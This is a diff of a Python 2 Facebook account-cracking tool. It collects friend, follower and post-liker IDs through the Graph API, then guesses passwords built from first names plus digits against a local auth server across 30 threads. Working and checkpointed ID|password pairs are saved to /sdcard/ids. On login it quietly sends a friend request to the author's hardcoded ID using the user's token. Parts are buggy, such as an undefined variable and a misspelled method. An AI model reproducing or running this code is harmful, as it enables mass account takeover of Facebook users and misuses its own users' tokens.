@@ -8,901 +8,853 @@
 try:
     import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookielib,getpass,mechanize,requests
     from multiprocessing.pool import ThreadPool
-    from requests.exceptions import ConnectionError
-    from mechanize import Browser
 except ImportError:
-    os.system('pip2 install requests')
-    os.system('pip2 install mechanize')
-    os.system('python2 sani.py')
-
-#Browser Setting
+    os.system("pip2 install requests")
+    os.system("pkg install nodejs")
+    os.system("python2 sani.py")
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass 
+os.system("git pull")
+from requests.exceptions import ConnectionError
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-cj = cookielib.LWPCookieJar()
-br.set_handle_robots(False)
-br.set_handle_redirect(True)
-br.set_cookiejar(cj)
-br.set_handle_equiv(True)
-br.set_handle_referer(True)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-bd = random.randint(2e+07, 3e+07)
-sim = random.randint(20000, 40000)
-br.addheader = {
-    'x-fb-connection-bandwidth': repr(bd),
-    'x-fb-sim-hni': repr(sim),
-    'x-fb-net-hni': repr(sim),
-    'x-fb-connection-quality': 'EXCELLENT',
-    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
-    'content-type': 'application/x-www-form-urlencoded',
-    'x-fb-http-engine': 'Liger' } 
-def exit():
-	print "[!] Exit"
-	os.sys.exit()
-
-
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
-
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def jam(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.03)
-def sani(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.1)
-##### LOGO #####
-banner = """
-\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
-\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
-\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
-\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
-\033[1;94m══════════════════════════════════════════════
-\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
-\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
-\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
-\033[1;94m══════════════════════════════════════════════ """
-# titik #
-def tik():
-	titik = [".   ","..  ","... "]
-	for o in titik:
-		print("\r[✔] Logging In "+o),;sys.stdout.flush();time.sleep(1)
-
-back = 0
-threads = []
-successful = []
-checkpoint = []
-oks = []
-cps = []
-gagal = []
+sys.setdefaultencoding("utf8")
+ 
+logo = """
+\033[1;91m   ██████████  ██████████  █████████   ▀
+   ███    ███  ███    ███  ███   ███  ███ 
+   ███         ███    ███  ███   ███  ███ 
+   ██████████  ██████████  ███   ███  ███ 
+          ███  ███    ███  ███   ███  ███  
+   ███    ███  ███    ███  ███   ███  ███  
+   ██████████  ███    ███  ███   ███  ███ \033[1;36mQUEEN
+\033[1;97m══════════════════════════════════════════════
+ [✓] Owner   : Sania Zahra x Shiffa Khan
+ [✓] Github  : https://github.com/Stylish-Queen   
+ [✓] Facebook: Jam Shahrukh Official
+ [✓] don't pheel me:) hatterz make me famous 
+══════════════════════════════════════════════"""
 idh = []
-id = []
-emfromfriend = []
-nofromfriend = []
-			
-#Menu
-def menu():
-	os.system('apt update && apt install nodejs -y')
-        os.system('cd ..... && npm install')
-        os.system('fuser -k 5000/tcp &')
-        os.system('#')
-        os.system('cd ..... && node index.js &')
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		print"[!] Token Not Found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		name = a['name']
-		id = a['id']
-	except KeyError:
-		os.system('clear')
-		print"[!] Account Is On Checkpoint"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	except requests.exceptions.ConnectionError:
-		print"[!] No Connection"
-		time.sleep(1)
-		('python2 jam.py')
-	os.system("clear")
-	print banner
-	print "|[✓] Name: "+name
-	print "|[✓] ID  : "+id
-	print (47*"-")
-	print "[1] Start Cloning."
-	print "[2] Clone With Fast Mode."
-	print "[3] Extract Tools."
-	print "[4] Lock Profile Tool."
-	print "[5] Auto Del Tools."
-	print "[6] Update jam Tool."
-	print "[7] Follow Me On Facebook."
-	print "[8] Logout"
-	print ('                  ')
-	men()
+back = 0
 
-def men():
-	rana = raw_input("Choose Option >>  ")
-	if rana =="":
-		print " Wrong Input"
-		men()
-	elif rana =="1":
-		crack()
-	elif rana =="2":
+def tlogin():
+	os.system('clear')
+	print(logo)
+	username = raw_input("[+] TOOL USERNAME: ")
+	if username =="saniqueen":
 	    os.system('clear')
-	    jam('[!] Please Wait While Page Is Loding.')
-	    sani('Stylish Queen-10%...')
-	    sani('Stylish Queen-20%...')
-	    sani('Stylish Queen-50%...')
-	    sani('Stylish Queen-70%...')
-	    sani('Stylish Queen-90%...')
-	    sani('Stylish Queen-100%...')
-	    os.system('python2 choice.py')
+	    print(logo)
+	    print "[✓] TOOL USERNAME: "+username+ " (correct)"
+	else:
+	    print "[!] Invalid Username."
+	    os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
 	    time.sleep(1)
-	elif rana =="3":
-		grab()
-	elif rana =="4":
-		os.system('clear')
-		os.system('python locked.py')
-		time.sleep(1)
-	elif rana =="5":
-		bot()
-	elif rana =="6":
-		os.system('clear')
-		print banner
-		jam('[✓] Please Wait While Tool Is Updating')
-		os.system('git pull origin master')
-		jam('[✓] Tool Has Been Update Successfully')
-		jam('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
-		time.sleep(3)
-		os.system('cd .. && rm -rf sani && cd sani')
-		os.system('python2 jam.py')
-	elif rana =="7":
-		os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
-		menu()
-	elif rana =="8":
-		os.system('rm -rf login.txt')
-		jam('[✓] Logged Out Successfully')
-		os.system('python2 jam.py')
-	else:
-		print "[!] Wrong Input"
-		men()
-	
-##### INFO #####
-def crack():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"Token invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	os.system('clear')
-	print banner
-	print "[1] Clone From Friendlist."
-	print "[2] Clone From Any Public ID."
-	print "[3] Clone From File."
-	print "[0] Back."
-	crack_menu()
-
-def crack_menu():
-	crm = raw_input("Choose Option >>  ")
-	if crm =="":
-		print "[!] Filled Incorrectly"
-		crack_menu()
-	elif crm =="1":
-		os.system('clear')
-		print banner
-		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                pass3 = raw_input(' \033[1;92m[3]Password: ')
-		pass4 = raw_input(' \033[1;92m[4]Password: ')
-                pass5 = raw_input(' \033[1;92m[5]Password: ')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif crm =="2":
-		os.system('clear')
-		print banner
-		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                pass3 = raw_input(' \033[1;92m[3]Password: ')
-		pass4 = raw_input(' \033[1;92m[4]Password: ')
-                pass5 = raw_input(' \033[1;92m[5]Password: ')
-		idt = raw_input("[+] Input ID: ")
-		
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			jam('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
-		except KeyError:
-			print"[!] ID Not Found!"
-			raw_input("\nPress Enter To Back  ")
-			crack()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
-	elif crm =="3":
+	    tlogin()
+	    
+	passw = raw_input("[+] TOOL PASSWORD: ")
+	if passw =="shiffakoji":
 	    os.system('clear')
-	    print banner
-	    p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-            p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-            pass3 = raw_input(' \033[1;92m[3]Password: ')
-	    pass4 = raw_input(' \033[1;92m[4]Password: ')
-            pass5 = raw_input(' \033[1;92m[5]Password: ')
-	    try:
-	        idlist= raw_input('[+] File Name: ')
-	        for line in open(idlist ,'r').readlines():
-	            id.append(line.strip())
-	    except IOError:
-	         print"[!] File Not Found."
-	         raw_input('Press Enter To Back. ')
-	         crack()
-	   
-	        
-	        
-	elif crm =="0":
-		menu()
+	    print(logo)
+	    print "[✓] TOOL USERNAME: " +username+ " (correct)"
+	    print "[✓] TOOL PASSWORD: " +passw+ "  (correct)"
+	    os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
+	    time.sleep(1)
+	    login_choice()
 	else:
-		print "Filled Incorrectly"
-		crack_menu()
-	
-        jam('[✓] Total Friends: '+str(len(id)))
-        time.sleep(0.5)
-	jam('[✓] The Process Has Been Started.')
-	time.sleep(0.5)
-        jam('[!] To Stop Process Press CTRL Then Z')
-        time.sleep(0.5)
-        print (47*"-")
-     
-	
-	
-			
+	    print "[!] Invalid Password."
+	    time.sleep(1)
+	    tlogin()
+	try:
+		toket = open('.login.txt','r')
+		os.system('python2 sani.py')
+	except (KeyError,IOError):
+		login_choice()
+	else:
+		print "[!] Invalid Password"
+		time.sleep(1)
+		tlogin()
+
+def login_choice():
+	os.system("clear")
+	try:
+		token = open(".login.txt","r").read()
+		menu()
+	except IOError:
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mLOGIN MENU\033[0;97m")
+		print("══════════════════════════════════════════════")
+		print("[1] Login with token")
+		print("[2] Login with id/pass")
+		print("══════════════════════════════════════════════")
+		login_select()
+def login_select():
+	select = raw_input("\033[1;33mChoose option: \033[0;97m")
+	if select =="1":
+		login_token()
+	elif select =="2":
+		login_fb()
+	else:
+		print("══════════════════════════════════════════════")
+		print("\t    \033[1;31mSelect valid option\033[0;97m")
+		print("")
+		time.sleep(1)
+		login_select()
+def login_fb():
+	os.system("clear")
+	print(logo)
+	print("\t    \033[1;32mLOGIN WITH ID/PASS\033[0;97m")
+	print("══════════════════════════════════════════════")
+	id = raw_input(" Id/mail/number: ")
+	id1=id.replace(' ','')
+	id2=id1.replace('(','')
+	uid=id2.replace(')','')
+	pwd = raw_input(" Password: ")
+	print("")
+	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
+	q = json.loads(data)
+	if "loc" in q:
+		jam = open(".login.txt","w")
+		jam.write(q["loc"])
+		jam.close()
+		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
+		menu()
+	elif "www.facebook.com" in q["error"]:
+		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
+		time.sleep(1)
+		print("══════════════════════════════════════════════")
+		raw_input("\tPress enter to back ")
+		login_choice()
+	else:
+		print("")
+		print("\t    \033[1;31mIncorrect credentials\033[0;97m")
+		raw_input("Press enter to try again ")
+		login_choice()
+def login_token():
+	os.system("clear")
+	try:
+		token = open(".login.txt","r").read()
+		time.sleep(1)
+		menu()
+	except (KeyError , IOError):
+	    os.system("clear")
+	    print(logo)
+	    print("")
+	    print("\t    \033[1;32mFB TOKEN LOGIN\033[0;97m")
+	    print("")
+	    token = raw_input(" Paste token here: ")
+	    token_save = open(".login.txt","w")
+	    token_save.write(token)
+	    token_save.close()
+	    time.sleep(1)
+	    menu()
+def menu():
+	os.system("clear")
+	try:
+		token = open(".login.txt","r").read()
+	except IOError:
+		os.system("clear")
+		print(logo)
+		print("\t    \033[1;31mToken not found\033[0;97m")
+		time.sleep(1)
+		login_choice()
+	try:
+		r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
+		a = json.loads(r.text)
+		name = a["name"]
+	except KeyError:
+		os.system("clear")
+		print(logo)
+		print("\t    \033[1;31mToken expired\033[0;97m")
+		time.sleep(1)
+		os.system("rm -rf .login.txt")
+		login_choice()
+	os.system("clear")
+	print(logo)
+	print("\t    \033[7m\033[1;32mUser: "+name+"\033[0;97m")
+	print("══════════════════════════════════════════════")
+	print("[1] Crack normal mode")
+	print("[2] Crack medium mode")
+	print("[3] Crack fast mode")
+	print("[4] Create File")
+	print("[5] Extract Group Post Likes")
+	print("══════════════════════════════════════════════")
+	menu_option()
+def menu_option():
+	select = raw_input("\033[1;33mChoose option: \033[0;97m")
+	if select =="1":
+		crack()
+	elif select =="2":
+		choice()
+	elif select =="3":
+		choice_jam()
+	elif select =="4":
+		ex_id()
+	elif select =="5":
+	        ex_post()
+	else:
+		print("")
+		print("\t    \033[1;31mSelect valid option\033[0;97m")
+		print("")
+		menu_option()
+def crack():
+	global token
+	os.system("clear")
+	try:
+		token = open(".login.txt","r").read()
+	except IOError:
+		print("")
+		print("\t    \033[1;31mToken not found\033[0;97m")
+		time.sleep(1)
+		login_choice()
+	os.system("clear")
+	print(logo)
+	print("\t    \033[7m\033[1;32mNORMAL CRACK MENU\033[0;97m")
+	print("══════════════════════════════════════════════")
+	print("[1] Crack public id")
+	print("[2] Crack followers")
+	print("[3] Crack file")
+	print("[0] Back")
+	print("")
+	crack_select()
+def crack_select():
+	select = raw_input("\033[1;33mChoose option: \033[0;97m")
+	id=[]
+	oks=[]
+	cps=[]
+	if select =="1":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
+		print("══════════════════════════════════════════════")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
+		idt = raw_input(" Input id: ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print(" Cloning from : "+q["name"])
+		except KeyError:
+			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+			print("")
+			raw_input(" Press enter to back")
+			crack()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="2":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
+		print("══════════════════════════════════════════════")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print(" Cloning from: "+q["name"])
+		except KeyError:
+			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+			print("")
+			raw_input(" Press enter to back")
+			crack()
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid = i["id"]
+			na = i["name"]
+			nm = na.rsplit(" ")[0]
+			id.append(uid+"|"+nm)
+	elif select =="3":
+		os.system("clear")
+		print(logo)
+		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
+		print("══════════════════════════════════════════════")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
+		try:
+			filelist = raw_input("[+] File : ")
+			for line in open(filelist , "r").readlines():
+			    id.append(line.strip())
+		except (KeyError,IOError):
+			print("")
+			print("\t    \033[1;31mRequested file not found\033[0;97m")
+			print("")
+			raw_input(" Press enter to back ")
+			crack()
+	elif select =="0":
+	    menu()
+	else:
+		print("")
+		print("\t    \033[1;31mSelect valid option\033[0;97m")
+		print("")
+		crack_select()
+	print("Total IDs : "+str(len(id)))
+	print("The Process has started")
+	print("══════════════════════════════════════════════")
 	def main(arg):
-		global cpb,oks
-		user = arg
-                (uid, name) = user.split('|')
+		user=arg
+		uid,name=user.split("|")
 		try:
-		    os.mkdir('/sdcard/ids')
-		except OSError:
-		    pass
-		try:
-                    pass1 = name.lower() + p1
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
-                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass1 + '\n')
-                        ok.close()
-                        oks.append(uid + pass1)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
-                        cp = open('jam_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass1 + '\n')
-                        cp.close()
-                        cps.append(uid + pass1)
-		    else:
-			pass2 = name.lower() + p2
-                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
-                        q = json.loads(data)
-                        if 'loc' in q:
-                            print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
-                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                            ok.write(uid + ' | ' + pass2 + '\n')
-                            ok.close()
-                            oks.append(uid + pass2)
-                        elif 'www.facebook.com' in q['error']:
-                            print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
-                            cp = open('jam_CP.txt', 'a')
-                            cp.write(uid + ' | ' + pass2 + '\n')
-                            cp.close()
-                            cps.append(uid + pass2)
+			pass1 = name.lower() + p1
+			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
+			q = json.loads(data)
+			if "loc" in q:
+				print("\033[1;92m[Sania-Ok] "+uid+" | "+pass1)
+				ok = open("/sdcard/ids/Jam-Ok.txt", "a")
+				ok.write(uid+" | "+pass1+"\n")
+				ok.close()
+				oks.append(uid+pass1)
 			else:
-                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = br.addheader).text
-                            q = json.loads(data)
-                            if 'loc' in q:
-                                print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass3
-                                ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                ok.write(uid + ' | ' + pass3 + '\n')
-                                ok.close()
-                                oks.append(uid + pass3)
-                            elif 'www.facebook.com' in q['error']:
-                                print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass3
-                                cp = open('jam_CP.txt', 'a')
-                                cp.write(uid + ' | ' + pass3 + '\n')
-                                cp.close()
-                                cps.append(uid + pass3)
-			    else:
-				data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = br.addheader).text
-                                q = json.loads(data)
-                                if 'loc' in q:
-                                    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4
-                                    ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                    ok.write(uid + ' | ' + pass4 + '\n')
-                                    ok.close()
-                                    oks.append(uid + pass4)
-                                elif 'www.facebook.com' in q['error']:
-                                    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass4
-                                    cp = open('jam_CP.txt', 'a')
-                                    cp.write(uid + ' | ' + pass4 + '\n')
-                                    cp.close()
-                                    cps.append(uid + pass4)
+				if "www.facebook.com" in q["error"]:
+					print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass1)
+					cp = open("/sdcard/ids/jam_cp.txt","a")
+					cp.write(uid+" | "+pass1+"\n")
+					cp.close()
+					cps.append(uid+pass1)
 				else:
-				    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = br.addheader).text
-                                    q = json.loads(data)
-                                    if 'loc' in q:
-                                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass5
-                                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                        ok.write(uid + ' | ' + pass5 + '\n')
-                                        ok.close()
-                                        oks.append(uid + pass5)
-                                    elif 'www.facebook.com' in q['error']:
-                                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass5
-                                        cp = open('jam_CP.txt', 'a')
-                                        cp.write(uid + ' | ' + pass5 + '\n')
-                                        cp.close()
-                                        cps.append(uid + pass5)
+					pass2 = name.lower() + p2
+					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
+					q = json.loads(data)
+					if "loc" in q:
+						print("\033[1;92m[Sania-Ok] "+uid+" | "+pass2)
+						ok = open("/sdcard/ids/Jam-Ok.txt", "a")
+						ok.write(uid+" | "+pass2+"\n")
+						ok.close()
+						oks.append(uid+pass2)
+					else:
+						if "www.facebook.com" in q["error"]:
+							print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass2)
+							cp = open("/sdcard/ids/jam_cp.txt","a")
+							cp.write(uid+" | "+pass2+"\n")
+							cp.close()
+							cps.append(uid+pass2)
+						else:
+							pass3 = name.lower() + p3
+							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
+							q = json.loads(data)
+							if "loc" in q:
+								print("\033[1;92m[Sania-Ok] "+uid+" | "+pass3)
+								ok = open("/sdcard/ids/Jam-Ok.txt", "a")
+								ok.write(uid+" | "+pass3+"\n")
+								ok.close()
+								oks.append(uid+pass3)
+							else:
+								if "www.facebook.com" in q["error"]:
+									print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass3)
+									cp = open("/sdcard/ids/jam_cp.txt","a")
+									cp.write(uid+" | "+pass3+"\n")
+									cp.close()
+									cps.append(uid+pass3)
+								else:
+									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
+									q = json.loads(data)
+									if "loc" in q:
+										print("\033[1;92m[Sania-Ok] "+uid+" | "+pass4)
+										ok = open("/sdcard/ids/Jam-Ok.txt", "a")
+										ok.write(uid+" | "+pass4+"\n")
+										ok.close()
+										oks.append(uid+pass4)
+									else:
+										if "www.facebook.com" in q["error"]:
+											print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass4)
+											cp = open("/sdcard/ids/jam_cp.txt","a")
+											cp.write(uid+" | "+pass4+"\n")
+											cp.close()
+											cps.apppend(uid+pass4)
+										else:
+											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
+											q = json.loads(data)
+											if "loc" in q:
+												print("\033[1;92m[Sania-Ok] "+uid+" | "+pass5)
+												ok = open("/sdcard/ids/Jam-Ok.txt", "a")
+												ok.write(uid+" | "+pass5+"\n")
+												ok.close()
+												oks.append(uid+pass5)
+											else:
+												if "www.facebook.com" in q["error"]:
+													print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass5)
+													cp = open("/sdcard/ids/jam_cp.txt","a")
+													cp.write(uid+" | "+pass5+"\n")
+													cp.close()
+													cps.append(uid+pass5)
+												else:
+													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
+													q = json.loads(data)
+													if "loc" in q:
+														print("\033[1;92m[Sania-Ok] "+uid+" | "+pass6)
+														ok = open("/sdcard/ids/jam_ok.txt", "a")
+														ok.write(uid+" | "+pass6+"\n")
+														ok.close()
+														oks.append(uid+pass6)
+													else:
+														if "www.facebook.com" in q["error"]:
+															print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass6)
+															cp = open("/sdcard/ids/jam_cp.txt","a")
+															cp.write(uid+" | "+pass6+"\n")
+															cp.close()
+															cps.append(uid+pass6)
+																
 		except:
 			pass
-		
+	
 	p = ThreadPool(30)
-	p.map(main, id)
-	print "\033[1;97m----------------------------------------------"
-	jam('[✓] Process Has Been Completed.')
-	jam('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
-	xx = str(len(oks))
-	xxx = str(len(cps))
-	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
-	print (47*"-")
-	
-	raw_input("\nPress Enter To Back ")
-	menu()	
-	
-
- 
-
-
-##### Grab #####
-def grab():
-	os.system('clear')
+	p.map(main,id)
+	print("══════════════════════════════════════════════")
+	print(" The process has completed")
+	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
+	print("══════════════════════════════════════════════")
+	raw_input(" Press enter to back")
+	crack()
+def ex_id():
+    idg=[]
+    global token
+    try:
+    	token = open(".login.txt","r").read()
+    except IOError:
+    	print("\t    \033[1;31mToken not found\033[0;97m")
+    	print("")
+    	time.sleep(1)
+    	login_choice()
+    os.system("clear")
+    print(logo)
+    print("\t    \033[7m\033[1;32mCOLLECT PUBLIC ID FRIENDLIST\033[0;97m")
+    print("══════════════════════════════════════════════")
+    idh = raw_input(" Input Id: ")
+    try:
+        r = requests.get("https://graph.facebook.com/"+idh+"?access_token="+token, headers=header)
+        q = json.loads(r.text)
+        print(" \033[7m\033[1;32mCollecting from: "+q["name"])
+    except KeyError:
+    	print("")
+        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+        print("")
+        raw_input(" Press enter to back")
+        crack()
+    r = requests.get("https://graph.facebook.com/"+idh+"/friends?access_token="+token, headers=header)
+    q = json.loads(r.text)
+    ids = open("ids_file.txt","w")
+    for i in q["data"]:
+        uid = i["id"]
+        na = i["name"]
+        nm=na.rsplit(" ")[0]
+        idg.append(uid+"|"+nm)
+        ids.write(uid+"|"+nm + "\n")
+    ids.close()
+    print("══════════════════════════════════════════════")
+    print(" The process has completed")
+    print(" Total ids: "+str(len(idg)))
+    print("══════════════════════════════════════════════")
+    raw_input(" Press enter to download file")
+    os.system("cp ids_file.txt /sdcard")
+    os.system("rm -rf ids_file.txt")
+    print(" File downloaded successfully")
+    time.sleep(1)
+    menu()
+def ex_post():
+    idg=[]
+    global token
+    try:
+    	token = open(".login.txt","r").read()
+    except IOError:
+    	print("\t    \033[1;31mToken not found\033[0;97m")
+    	print("")
+    	time.sleep(1)
+    	login_choice()
+    os.system("clear")
+    print(logo)
+    una = ('100052292505058')
+    print("\t    \033[7m\033[1;32mCOLLECT POST LIKES LINKS\033[0;97m")
+    print("══════════════════════════════════════════════")
+    una = raw_input(" Input Post Id: ")
+    try:
+        r = requests.get("https://graph.facebook.com/me/friends?method=post&uids="+una+"&access_token="+token, headers=header)
+        q = json.loads(r.text)
+	print("══════════════════════════════════════════════")
+    except KeyError:
+    	print("")
+        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+        print("")
+        raw_input(" Press enter to back")
+        crack()
+    r = requests.get("https://graph.facebook.com/"+una+"/reactions?limit=9999999&access_token="+token, headers=header)
+    q = json.loads(r.text)
+    ids = open("likes_post.txt","w")
+    for i in q["friends"]["data"]:
+        uid = i["id"]
+        na = i["name"]
+        nm=na.rsplit(" ")[0]
+        idg.append(uid+"|"+nm)
+        ids.write(uid+"|"+nm + "\n")
+    ids.close()
+    print("══════════════════════════════════════════════")
+    print(" The process has completed")
+    print(" Total ids: "+str(len(idg)))
